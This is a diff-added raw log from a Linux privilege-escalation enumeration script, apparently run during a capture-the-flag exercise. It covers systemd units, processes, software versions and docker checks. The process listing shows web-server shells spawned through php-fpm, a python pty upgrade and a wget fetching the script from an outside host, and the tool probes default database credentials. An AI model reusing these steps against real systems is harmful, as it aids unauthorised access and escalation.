+lrwxrwxrwx 1 root root 29 Sep 30 15:23 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Sep 30 15:23 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Sep 30 15:23 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Sep 30 15:23 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Sep 30 15:23 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Sep 30 15:23 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx 1 root root 15 Jun 10 18:05 dbus.service -> ../dbus.service
+lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-quit.service -> ../plymouth-quit.service
+lrwxrwxrwx 1 root root 29 Apr  4  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Sep 30 15:23 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Sep 30 15:23 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Sep 30 15:23 debian.conf
+
+/lib/systemd/system/user@.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 125 Sep 30 15:23 timeout.conf
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx 1 root root 31 Apr  4  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 28 Apr  4  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 26 Apr  4  2019 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/system-generators:
+total 228K
+-rwxr-xr-x 1 root root 23K Sep 30 15:23 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root 10K Sep 30 15:23 systemd-debug-generator
+-rwxr-xr-x 1 root root 31K Sep 30 15:23 systemd-fstab-generator
+-rwxr-xr-x 1 root root 14K Sep 30 15:23 systemd-getty-generator
+-rwxr-xr-x 1 root root 26K Sep 30 15:23 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root 10K Sep 30 15:23 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root 10K Sep 30 15:23 systemd-rc-local-generator
+-rwxr-xr-x 1 root root 10K Sep 30 15:23 systemd-system-update-generator
+-rwxr-xr-x 1 root root 31K Sep 30 15:23 systemd-sysv-generator
+-rwxr-xr-x 1 root root 14K Sep 30 15:23 systemd-veritysetup-generator
+-rwxr-xr-x 1 root root 19K Jul 12 08:40 snapd-generator
+-rwxr-xr-x 1 root root 11K Jun  4 09:59 lvm2-activation-generator
+
+/lib/systemd/network:
+total 16K
+-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
+-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
+-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
+-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link
+
+/lib/systemd/system-preset:
+total 4.0K
+-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset
+
+/lib/systemd/system-shutdown:
+total 4.0K
+-rwxr-xr-x 1 root root 160 Apr 10  2019 mdadm.shutdown
+
+/lib/systemd/system-sleep:
+total 4.0K
+-rwxr-xr-x 1 root root 92 Feb 22  2018 hdparm
+[90m---[0;0m
+[35m==============================================================([32m processes [35m)=====[0;0m
+[97m[[91m![97m] [90mpro000[97m Can we write in any process binary?[90m.............................[90m nope[0;0m
+[97m[[93m*[97m] [90mpro010[97m Processes running with root permissions[90m.........................[36m yes![0;0m
+[90m---[0;0m
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 15:18 ?        00:00:02 /sbin/init
+root       494     1  0 15:18 ?        00:00:00 /lib/systemd/systemd-journald
+root       505     1  0 15:18 ?        00:00:00 /lib/systemd/systemd-udevd
+root       705     1  0 15:18 ?        00:00:00 /usr/bin/VGAuthService
+root       772     1  0 15:18 ?        00:00:04 /usr/bin/vmtoolsd
+root       794     1  0 15:18 ?        00:00:00 /usr/sbin/cron -f
+root       797     1  0 15:18 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
+daemon     829     1  0 15:18 ?        00:00:00 /usr/sbin/atd -f
+root       830     1  0 15:18 ?        00:00:00 /lib/systemd/systemd-logind
+root       868     1  0 15:18 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
+root       935     1  0 15:18 ?        00:00:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
+root       946     1  0 15:18 ?        00:00:01 /usr/bin/containerd
+root       947     1  0 15:18 ?        00:00:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root       960     1  0 15:18 ?        00:00:00 /usr/sbin/sshd -D
+root      1008     1  0 15:18 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+root      1090     1  0 15:18 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root      1363   947  0 15:18 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
+root      1370   946  0 15:18 ?        00:00:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/613c70fa3dba2046a1257c6764d8d65864b93f23e81e907e0d9fb925a8c92d57 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1395  1370  0 15:18 ?        00:00:00 registry serve /etc/docker/registry/config.yml
+[90m---[0;0m
+[97m[[94mi[97m] [90mpro500[97m Running processes[90m...............................................[34m yes![0;0m
+[90m---[0;0m
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         2  0.0  0.0      0     0 ?        S    15:18   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    15:18   0:03  \_ [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    15:18   0:02  \_ [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    15:18   0:00  \_ [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [migration/0]
+root        11  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [kdevtmpfs]
+root        14  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [netns]
+root        15  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [rcu_tasks_kthre]
+root        16  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [kauditd]
+root        17  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [khungtaskd]
+root        18  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [oom_reaper]
+root        19  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [writeback]
+root        20  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [kcompactd0]
+root        21  0.0  0.0      0     0 ?        SN   15:18   0:00  \_ [ksmd]
+root        22  0.0  0.0      0     0 ?        SN   15:18   0:00  \_ [khugepaged]
+root        23  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [crypto]
+root        24  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kintegrityd]
+root        25  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kblockd]
+root        26  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ata_sff]
+root        27  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [md]
+root        28  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [edac-poller]
+root        29  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [devfreq_wq]
+root        30  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [watchdogd]
+root        32  0.0  0.0      0     0 ?        I    15:18   0:01  \_ [kworker/0:1]
+root        34  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [kswapd0]
+root        35  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kworker/u3:0]
+root        36  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [ecryptfs-kthrea]
+root        78  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kthrotld]
+root        79  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [acpi_thermal_pm]
+root        80  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_0]
+root        81  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_0]
+root        82  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_1]
+root        83  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_1]
+root        90  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ipv6_addrconf]
+root        99  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kstrp]
+root       116  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [charger_manager]
+root       166  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_2]
+root       167  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_2]
+root       168  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_3]
+root       169  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_3]
+root       170  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_4]
+root       171  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_4]
+root       172  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_5]
+root       173  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_5]
+root       174  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_6]
+root       175  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_6]
+root       182  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_7]
+root       183  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_7]
+root       184  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_8]
+root       186  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_8]
+root       189  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_9]
+root       190  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_9]
+root       191  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_10]
+root       192  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_10]
+root       194  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_11]
+root       195  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_11]
+root       197  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_12]
+root       199  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ttm_swap]
+root       200  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_12]
+root       202  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [irq/16-vmwgfx]
+root       203  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_13]
+root       205  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_13]
+root       207  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_14]
+root       210  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_14]
+root       211  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_15]
+root       213  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_15]
+root       214  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_16]
+root       217  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_16]
+root       218  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_17]
+root       220  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_17]
+root       221  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_18]
+root       224  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_18]
+root       225  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_19]
+root       227  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_19]
+root       228  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_20]
+root       231  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_20]
+root       232  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_21]
+root       235  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_21]
+root       236  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_22]
+root       238  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_22]
+root       239  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_23]
+root       241  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_23]
+root       242  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_24]
+root       243  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_24]
+root       245  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_25]
+root       246  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_25]
+root       248  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_26]
+root       250  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_26]
+root       252  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_27]
+root       254  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_27]
+root       257  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_28]
+root       258  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_28]
+root       259  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_29]
+root       260  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_29]
+root       261  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_30]
+root       262  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_30]
+root       263  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [scsi_eh_31]
+root       264  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [scsi_tmf_31]
+root       294  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kworker/0:1H]
+root       359  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [raid5wq]
+root       382  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kdmflush]
+root       383  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [bioset]
+root       392  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [kdmflush]
+root       393  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [bioset]
+root       439  0.0  0.0      0     0 ?        S    15:18   0:00  \_ [jbd2/dm-0-8]
+root       440  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ext4-rsv-conver]
+root       496  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [iscsi_eh]
+root       501  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ib-comp-wq]
+root       502  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ib_mcast]
+root       503  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [ib_nl_sa_wq]
+root       507  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [rpciod]
+root       508  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [xprtiod]
+root       514  0.0  0.0      0     0 ?        I<   15:18   0:00  \_ [rdma_cm]
+root      2378  0.0  0.0      0     0 ?        I    16:02   0:00  \_ [kworker/u2:0]
+root      2589  0.0  0.0      0     0 ?        I    16:09   0:00  \_ [kworker/0:2]
+root      2653  0.0  0.0      0     0 ?        I    16:14   0:00  \_ [kworker/u2:2]
+root      3022  0.0  0.0      0     0 ?        I    16:24   0:00  \_ [kworker/u2:1]
+root      3864  0.0  0.0      0     0 ?        I    16:32   0:00  \_ [kworker/0:0]
+root         1  0.0  0.8 159688  8624 ?        Ss   15:18   0:02 /sbin/init
+root       494  0.0  1.6 103040 16748 ?        S<s  15:18   0:00 /lib/systemd/systemd-journald
+root       505  0.0  0.3  45220  3796 ?        Ss   15:18   0:00 /lib/systemd/systemd-udevd
+root       705  0.0  0.9  88224  9616 ?        Ss   15:18   0:00 /usr/bin/VGAuthService
+systemd+   708  0.0  0.4  70628  4636 ?        Ss   15:18   0:00 /lib/systemd/systemd-resolved
+systemd+   709  0.0  0.3 141928  3072 ?        Ssl  15:18   0:00 /lib/systemd/systemd-timesyncd
+root       772  0.0  1.0 193124 10296 ?        Ssl  15:18   0:04 /usr/bin/vmtoolsd
+root       794  0.0  0.2  31320  2896 ?        Ss   15:18   0:00 /usr/sbin/cron -f
+root       797  0.0  0.6 289956  6848 ?        Ssl  15:18   0:00 /usr/lib/accountsservice/accounts-daemon
+syslog     799  0.0  0.4 263036  4536 ?        Ssl  15:18   0:00 /usr/sbin/rsyslogd -n
+message+   811  0.0  0.4  50040  4364 ?        Ss   15:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+daemon     829  0.0  0.2  28332  2140 ?        Ss   15:18   0:00 /usr/sbin/atd -f
+root       830  0.0  0.5  70604  5708 ?        Ss   15:18   0:00 /lib/systemd/systemd-logind
+root       868  0.0  0.5 288880  5876 ?        Ssl  15:18   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       935  0.0  2.1 441516 21392 ?        Ss   15:18   0:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
+www-data  1138  0.2  5.9 528444 60120 ?        S    15:18   0:09  \_ php-fpm: pool www
+www-data  3449  0.0  0.0   4628   860 ?        S    16:31   0:00  |   \_ sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data  3450  0.0  0.0   4628   772 ?        S    16:31   0:00  |       \_ /bin/sh -i
+www-data  2831  0.3  5.8 452572 58820 ?        S    16:19   0:03  \_ php-fpm: pool www
+www-data  4274  0.0  0.0   4628   872 ?        S    16:34   0:00  |   \_ sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data  4275  0.0  0.0   4628   832 ?        S    16:34   0:00  |       \_ /bin/sh -i
+www-data  3233  0.1  4.6 446084 47180 ?        S    16:27   0:00  \_ php-fpm: pool www
+www-data  3461  0.0  0.0   4628   784 ?        S    16:31   0:00  |   \_ sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data  3462  0.0  0.0   4628   780 ?        S    16:31   0:00  |       \_ /bin/sh -i
+www-data  3478  0.0  0.6  33088  7048 ?        S    16:32   0:00  |           \_ python -c import pty;pty.spawn("/bin/bash")
+www-data  3479  0.0  0.3  18508  3308 pts/5    Ss   16:32   0:00  |               \_ /bin/bash
+www-data  4014  0.0  0.2  29368  2156 pts/5    S+   16:33   0:00  |                   \_ wget http://10.10.15.82/lse.sh
+www-data  3477  0.1  4.8 446104 49320 ?        S    16:32   0:00  \_ php-fpm: pool www
+www-data  4159  0.1  4.2 445064 43160 ?        S    16:34   0:00  \_ php-fpm: pool www
+root       946  0.0  4.0 760160 40900 ?        Ssl  15:18   0:01 /usr/bin/containerd
+root      1370  0.0  0.4 109104  4604 ?        Sl   15:18   0:00  \_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/613c70fa3dba2046a1257c6764d8d65864b93f23e81e907e0d9fb925a8c92d57 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1395  0.0  1.2 121104 12884 ?        Ssl  15:18   0:00      \_ registry serve /etc/docker/registry/config.yml
+root       947  0.0  7.3 838984 74008 ?        Ssl  15:18   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1363  0.0  0.3 479264  4000 ?        Sl   15:18   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
+root       960  0.0  0.5  72296  5452 ?        Ss   15:18   0:00 /usr/sbin/sshd -D
+root      1506  0.0  0.5 107984  6008 ?        Ss   15:19   0:00  \_ sshd: bolt [priv]
+bolt      1565  0.0  0.3 108356  3704 ?        S    15:19   0:00  |   \_ sshd: bolt@pts/0
+bolt      1567  0.0  0.3  23296  3444 pts/0    Ss+  15:19   0:00  |       \_ -bash
+root      1587  0.0  0.6 107984  6880 ?        Ss   15:20   0:00  \_ sshd: bolt [priv]
+bolt      1607  0.0  0.4 108384  4372 ?        S    15:20   0:00  |   \_ sshd: bolt@pts/1
+bolt      1608  0.0  0.3  21472  3460 pts/1    Ss+  15:20   0:00  |       \_ -bash
+root      1647  0.0  0.6 107984  6960 ?        Ss   15:24   0:00  \_ sshd: bolt [priv]
+bolt      1667  0.0  0.3 107984  3352 ?        S    15:25   0:00  |   \_ sshd: bolt@pts/2
+bolt      1668  0.0  0.3  21472  3512 pts/2    Ss   15:25   0:00  |       \_ -bash
+bolt      4211  0.8  0.3  13432  3844 pts/2    S+   16:34   0:00  |           \_ /bin/bash ./lse.sh -l 2
+bolt      5719  0.0  0.2  13432  2392 pts/2    S+   16:35   0:00  |               \_ /bin/bash ./lse.sh -l 2
+bolt      5720  0.0  0.3  39988  3956 pts/2    R+   16:35   0:00  |                   \_ ps auxf
+root      1735  0.0  0.6 107984  6924 ?        Ss   15:35   0:00  \_ sshd: bolt [priv]
+bolt      1755  0.0  0.4 108096  4424 ?        S    15:35   0:01  |   \_ sshd: bolt@pts/3
+bolt      1756  0.0  0.3  21580  3436 pts/3    Ss+  15:35   0:00  |       \_ -bash
+root      1978  0.0  0.6 107984  6988 ?        Ss   15:43   0:00  \_ sshd: bolt [priv]
+bolt      1998  0.0  0.3 107984  3476 ?        S    15:43   0:02  |   \_ sshd: bolt@pts/4
+bolt      1999  0.0  0.2  21472  2500 pts/4    Ss   15:43   0:00  |       \_ -bash
+bolt      2270  4.2  1.1 704328 11280 pts/4    Sl+  15:56   1:38  |           \_ ./bash
+root      2182  0.0  0.6 107984  6848 ?        Ss   15:54   0:00  \_ sshd: bolt [priv]
+bolt      2202  0.0  0.4 108096  4308 ?        S    15:54   0:01  |   \_ sshd: bolt@pts/6
+bolt      2203  0.0  0.3  21572  3328 pts/6    Ss+  15:54   0:00  |       \_ -bash
+root      2211  0.0  0.6 107984  6868 ?        Ss   15:54   0:00  \_ sshd: bolt [priv]
+bolt      2234  0.0  0.3 107984  3540 ?        S    15:54   0:00  |   \_ sshd: bolt@pts/7
+bolt      2235  0.0  0.3  21604  3500 pts/7    Ss+  15:54   0:00  |       \_ -bash
+root      3055  0.0  0.7 107984  7152 ?        Ss   16:25   0:00  \_ sshd: bolt [priv]
+bolt      3083  0.0  0.4 108120  4668 ?        S    16:25   0:00      \_ sshd: bolt@notty
+bolt      3084  0.0  0.2  13060  2316 ?        Ss   16:25   0:00          \_ /usr/lib/openssh/sftp-server
+root      1008  0.0  0.1 152056  1700 ?        Ss   15:18   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+www-data  1010  1.4  1.0 154944 10188 ?        S    15:18   1:06  \_ nginx: worker process
+root      1090  0.0  0.1  16180  1664 tty1     Ss+  15:18   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+bolt      1526  0.0  0.7  76776  7296 ?        Ss   15:19   0:00 /lib/systemd/systemd --user
+bolt      1527  0.0  0.1 193592  1716 ?        S    15:19   0:00  \_ (sd-pam)
+[90m---[0;0m
+[97m[[94mi[97m] [90mpro510[97m Running process binaries and permissions[90m........................[34m yes![0;0m
+[90m---[0;0m
+-rwxr-xr-x 1 root root 56552 Aug 22 23:47 /sbin/agetty
+-rwxr-xr-x 1 root root 26632 Feb 20  2018 /usr/sbin/atd
+-rwxr-xr-x 1 root root 1113504 Jun  6 22:28 /bin/bash
+-rwxr-xr-x 1 root root 49044672 Oct 17 02:46 /usr/bin/containerd
+-rwxr-xr-x 1 root root 6117096 Oct 17 02:46 /usr/bin/containerd-shim
+-rwxr-xr-x 1 root root 47416 Nov 16  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root root 236584 Jun 10 18:05 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root 104761824 Oct 18 15:52 /usr/bin/dockerd
+-rwxr-xr-x 1 root root 3593848 Oct 18 15:52 /usr/bin/docker-proxy
+-rwxr-xr-x 1 root root 1149096 Aug 20 12:46 /usr/sbin/nginx
+-rwxr-xr-x 1 root root 4869304 Aug 12 19:34 /usr/sbin/php-fpm7.2
+-rwxr-xr-x 1 root root 133432 Aug  9 15:37 /bin/ps
+lrwxrwxrwx 1 root root 9 Apr 16  2018 /usr/bin/python -> python2.7
+-rwxr-xr-x 1 root root 680488 Apr 24  2018 /usr/sbin/rsyslogd
+lrwxrwxrwx 1 root root 4 Dec 28  2018 /bin/sh -> dash
+-rwxr-xr-x 1 root root 113120 Jan 18  2018 /usr/bin/sort
+-rwxr-xr-x 1 root root 786856 Mar  4  2019 /usr/sbin/sshd
+lrwxrwxrwx 1 root root 20 Sep 30 15:23 /bin/systemd -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root 88136 Sep 30 15:23 /usr/bin/systemd-resolve
+-rwxr-xr-x 1 root root 43224 Jan 18  2018 /usr/bin/uniq
+-rwxr-xr-x 1 root root 125144 May 14 07:07 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root 51456 May 14 07:07 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root 499264 Apr  8  2019 /usr/bin/wget
+-rwxr-xr-x 1 root root 71896 Nov  5  2017 /usr/bin/xargs
+[90m---[0;0m
+[35m===============================================================([32m software [35m)=====[0;0m
+[97m[[91m![97m] [90msof000[97m Can we connect to MySQL with root/root credentials?[90m.............[90m nope[0;0m
+[97m[[91m![97m] [90msof010[97m Can we connect to MySQL as root without password?[90m...............[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template0 as postgres and no pass?[90m.[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template1 as postgres and no pass?[90m.[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template0 as psql and no pass?[90m.....[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template1 as psql and no pass?[90m.....[90m nope[0;0m
+[97m[[93m*[97m] [90msof030[97m Installed apache modules[90m........................................[90m nope[0;0m
+[97m[[91m![97m] [90msof040[97m Found any .htpasswd files?[90m......................................[90m nope[0;0m
+[97m[[94mi[97m] [90msof500[97m Sudo version[90m....................................................[34m yes![0;0m
+[90m---[0;0m
+Sudo version 1.8.21p2
+[90m---[0;0m
+[97m[[94mi[97m] [90msof510[97m MySQL version[90m...................................................[90m nope[0;0m
+[97m[[94mi[97m] [90msof520[97m Postgres version[90m................................................[90m nope[0;0m
+[97m[[94mi[97m] [90msof530[97m Apache version[90m..................................................[90m nope[0;0m
+[35m=============================================================([32m containers [35m)=====[0;0m
+[97m[[93m*[97m] [90mctn000[97m Are we in a docker container?[90m...................................[90m nope[0;0m
+[97m[[93m*[97m] [90mctn010[97m Is docker available?[90m............................................[36m yes![0;0m
+[90m---[0;0m
+Docker version 19.03.4, build 9013bf583a
+[90m---[0;0m
+[97m[[91m![97m] [90mctn020[97m Is the user a member of the 'docker' group?[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90mctn200[97m Are we in a lxc container?[90m......................................[90m nope[0;0m
+[97m[[91m![97m] [90mctn210[97m Is the user a member of any lxc/lxd group?[90m......................[90m nope[0;0m
+
+[35m==================================([32m FINISHED [35m)==================================[0;0m
